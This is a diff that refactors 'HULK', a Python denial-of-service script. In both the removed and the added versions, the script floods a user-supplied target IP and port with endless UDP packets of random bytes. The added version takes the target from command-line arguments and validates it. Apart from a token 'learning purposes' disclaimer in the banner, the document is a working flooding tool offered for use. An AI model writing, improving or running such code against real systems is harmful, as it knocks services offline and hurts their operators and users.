@@ -1,93 +1,83 @@
-#Lets import modules
+# Import necessary modules
 import sys
 import os
 import time
 import socket
-import scapy.all as scapy
 import random
 import threading
-from django.core.validators import URLValidator
-from django.core.exceptions import ValidationError
-
-validate = URLValidator()
-
-#Lets start coding
 from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+from scapy.all import *
 
-#Lets define sock and bytes
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-os.system("clear")
-#Banner :
-print('''
+# Function to print the banner
+def print_banner():
+    print('''
     ************************************************
     *            _  _ _   _ _    _  __             *
-    *           | || | | | | |  | |/ /             * 
+    *           | || | | | | |  | |/ /             *
     *           | __ | |_| | |__| ' <              *
     *           |_||_|\___/|____|_|\_\             *
     *                                              *
     *          HTTP Unbearable Load King           *
     *          Author: Sumalya Chatterjee          *
+    ************************************************
+    ************************************************
     *                                              *
-    ************************************************
-    ************************************************
-    *                                              *    
     *  [!] Disclaimer :                            *
     *  1. Don't Use For Personal Revenges          *
     *  2. Author Is Not Responsible For Your Jobs  *
-    *  3. Use for learning purposes                * 
+    *  3. Use for learning purposes                *
     *  4. Does HULK suit in villain role, huh?     *
     ************************************************
-	''')
-#Type your ip and port number (find IP address using nslookup or any online website) 
-ip = input(" [+] Give HULK A Target IP : ")
-port = eval(input(" [+] Starting Port NO : "))
-os.system("clear")
-print('''
-    ************************************************
-    *            _  _ _   _ _    _  __             *
-    *           | || | | | | |  | |/ /             * 
-    *           | __ | |_| | |__| ' <              *
-    *           |_||_|\___/|____|_|\_\             *
-    *                                              *
-    *          HTTP Unbearable Load King           *
-    *          Author: Sumalya Chatterjee          *
-    *                                              *
-    ************************************************
+    ''')
 
-	''')
-try:
-	validate = ip
-	print(" ✅ Valid IP Checked.... ")
-	print(" [+] Attack Screen Loading ....")
-except ValidationError as exception :
-	print(" ✘ Input a right url")
+# Main function to initiate the attack
+def hulk_attack(target_ip, target_port):
+    # Initialize the socket and generate random bytes
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    
+    # Clear screen and print banner
+    os.system("clear")
+    print_banner()
+    
+    # Print attack information
+    print(f"\n [+] HULK is attacking server {target_ip}:{target_port}\n")
+    time.sleep(3)  # Delay before starting attack
+    
+    # Attack loop
+    sent = 0
+    try:
+        while True:
+            sock.sendto(bytes, (target_ip, target_port))
+            sent += 1
+            print(f" [+] Successfully sent {sent} packet to {target_ip} through port: {target_port}")
+            if target_port == 65534:
+                target_port = 1
+    except KeyboardInterrupt:
+        print("\n [-] Ctrl+C Detected... Exiting")
+    finally:
+        sock.close()
 
-#Lets start our attack
-print(" ")
-print("    That's my secret Cap, I am always angry ")
-print(" " )
-print(" [+] HULK is attacking server " + ip )
-print (" " )
-time.sleep(5)
-sent = 0
-try :
- while True:
-		sock.sendto(bytes, (ip, port))
-		sent = sent + 1
-		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
-		if port == 65534:
-			port = 1
-except KeyboardInterrupt:
-	print(" ")
-	print("\n [-] Ctrl+C Detected.........Exiting")
-	print(" [-] DDOS ATTACK STOPPED")
-input(" Enter To Exit")
-os.system("clear")
-print(" [-] Dr. Banner is tired...")
+if __name__ == "__main__":
+    # Check for correct command-line arguments
+    if len(sys.argv) != 3:
+        print("Usage: python hulk.py <target_ip> <target_port>")
+        sys.exit(1)
+    
+    # Validate and parse command-line arguments
+    target_ip = sys.argv[1]
+    try:
+        target_port = int(sys.argv[2])
+    except ValueError:
+        print("Error: Invalid port number")
+        sys.exit(1)
+    
+    # Validate IP address format
+    try:
+        socket.inet_aton(target_ip)
+    except socket.error:
+        print("Error: Invalid IP address")
+        sys.exit(1)
+    
+    # Start the attack
+    hulk_attack(target_ip, target_port)
